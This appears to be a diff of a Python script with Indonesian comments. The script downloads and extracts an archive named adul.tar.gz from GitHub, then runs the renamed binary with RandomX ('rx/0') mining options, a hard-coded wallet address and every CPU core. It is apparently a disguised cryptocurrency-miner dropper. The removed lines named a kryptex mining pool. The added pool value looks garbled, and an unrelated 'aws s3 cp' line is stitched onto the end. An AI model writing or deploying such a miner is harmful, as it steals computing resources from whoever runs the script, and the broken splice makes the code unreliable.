@@ -56,40 +56,43 @@ import tarfile
 import urllib.request
 import time
 import shutil
-import platform
-import socket
 
+# Perbaikan: Masukkan nilai langsung ke dalam variabel
+buyu = "rx/0"
+aming = "164az6Jw8Y3pJJd8XcCwjVYykBTHQWRq4vEg8beNnQWm3MPWj4biVANqDYve9xfJiN5JDN4PiHRta31o2awd4k3AbEbs4bi3NrV8DUzt9g6pJeTkrFtjJtEvPTo7SAVdtYb5fWx"
+
+# Mengambil jumlah core CPU (setara dengan nproc --all)
+try:
+    threads = os.cpu_count() or 1
+except Exception:
+    threads = 1
 def run_with_loading(message, cmd, *args):
     sys.stdout.write(f"[|] {message}")
     sys.stdout.flush()
     
-    spinner = ["|", "/", "-", "\"]
-    
-    # Run process
+    spinner = ["|", "/", "-", "\\"]
     try:
         process = subprocess.Popen([cmd] + list(args), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except Exception as e:
+    except Exception:
         sys.stdout.write(f"\r[✖] {message} gagal\n")
         return 1
 
-    idx = 0
     while process.poll() is None:
-        char = spinner[idx % len(spinner)]
-        sys.stdout.write(f"\r[{char}] {message}")
-        sys.stdout.flush()
-        time.sleep(0.08)
-        idx += 1
+        for char in spinner:
+            sys.stdout.write(f"\r[{char}] {message}")
+            sys.stdout.flush()
+            time.sleep(0.08)
+            if process.poll() is not None:
+                break
 
     status = process.returncode
     if status == 0:
         sys.stdout.write(f"\r[✔] {message} selesai\n")
     else:
         sys.stdout.write(f"\r[✖] {message} gagal\n")
-    
     return status
 
-# 1. Download
-# Using urllib for python curl equivalent
+# 1. Download adul.tar.gz
 def download_file(url, filename):
     sys.stdout.write(f"[|] Downloading {filename}...")
     sys.stdout.flush()
@@ -104,7 +107,7 @@ def download_file(url, filename):
 if download_file("https://github.com/habibbaharyuandi/lado/raw/refs/heads/main/adul.tar.gz", "adul.tar.gz") != 0:
     sys.exit(1)
 
-# 2. Ekstrak
+# 2. Extract adul.tar.gz
 def extract_tar(filename):
     sys.stdout.write(f"[|] Extracting {filename}...")
     sys.stdout.flush()
@@ -120,66 +123,49 @@ def extract_tar(filename):
 if extract_tar("adul.tar.gz") != 0:
     sys.exit(1)
 
-# === Ambil IP lokal dengan lebih aman dan andal ===
-worker_name = ""
+print(f"Menjalankan ./adul dengan worker...")
 
-# Metode 1: Menggunakan hostname
-try:
-    worker_name = socket.gethostbyname(socket.gethostname())
-except Exception:
-    pass
+# 3. Menjalankan ./adul dengan parameter dan animasi jam pasir
+adul_process = subprocess.Popen(
+    ["./adul", "-a", buyu, "-o", "ieriuer", "-u", aming, "-t", str(threads)],
+    stdout=subprocess.PIPE,
+    stderr=subprocess.PIPE,
+    text=True
+)
 
-# Metode 2: Fallback ke ip route atau hostname -I via subprocess jika kosong
-if not worker_name:
-    try:
-        res = subprocess.check_output(["hostname", "-I"]).decode().strip()
-        if res:
-            worker_name = res.split()[0]
-    except Exception:
-        pass
-
-if not worker_name or worker_name == "0":
-    worker_name = "worker1"
-
-wallet = "164az6Jw8Y3pJJd8XcCwjVYykBTHQWRq4vEg8beNnQWm3MPWj4biVANqDYve9xfJiN5JDN4PiHRta31o2awd4k3AbEbs4bi3NrV8DUzt9g6pJeTkrFtjJtEvPTo7SAVdtYb5fWx"
-worker_tag = f"{wallet}/{worker_name}"
-
-try:
-    threads = os.cpu_count() or 1
-except Exception:
-    threads = 1
-
-print(f"Menjalankan adul dengan worker: {worker_tag}")
-
-adul_process = subprocess.Popen(["./adul", "-a", "rx/0", "-o", "xtm-rx-sg.kryptex.network:7038", "-u", worker_tag, "-t", str(threads)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-text = "NUJU PROSES"
-total_dots = 12
-dots = 0
+hourglass_frames = ["⌛", "⏳"]
+idx = 0
 
 print()
-
 try:
     while adul_process.poll() is None:
+        frame = hourglass_frames[idx % len(hourglass_frames)]
         sys.stdout.write('\033[1A\033[2K')
         cols = shutil.get_terminal_size((80, 20)).columns
-        total_len = len(text) + dots
-        x = (cols - total_len) // 2
-        if x < 0:
-            x = 0
+        text = f"[{frame}] Proses adul sedang berjalan..."
+        x = max(0, (cols - len(text)) // 2)
         
-        dot_str = "." * dots
-        sys.stdout.write(f"\033[{x}G\033[1;37m{text}{dot_str}\033[0m\n")
+        sys.stdout.write(f"\033[{x}G\033[1;37m{text}\033[0m\n")
         sys.stdout.flush()
         
-        dots = (dots + 1) % (total_dots + 1)
-        time.sleep(0.16)
+        time.sleep(0.3)
+        idx += 1
 except KeyboardInterrupt:
     adul_process.terminate()
 
-print("\033[0m\n[ SELESAI ] Proses adul telah berhenti.")
+# Mengambil output log setelah proses selesai
+stdout, stderr = adul_process.communicate()
 
+sys.stdout.write("\033[0m\n")
+print("[ SELESAI ] Proses adul telah berhenti.\n")
 
+if stdout:
+    print("--- Output Log ---")
+    print(stdout)
+
+if stderr:
+    print("--- Error Log ---")
+    print(stderr)
 aws s3 cp glue_job_etl.py "s3://${BUCKET_NAME}/scripts/glue_job_etl.py"
 
 # =========================
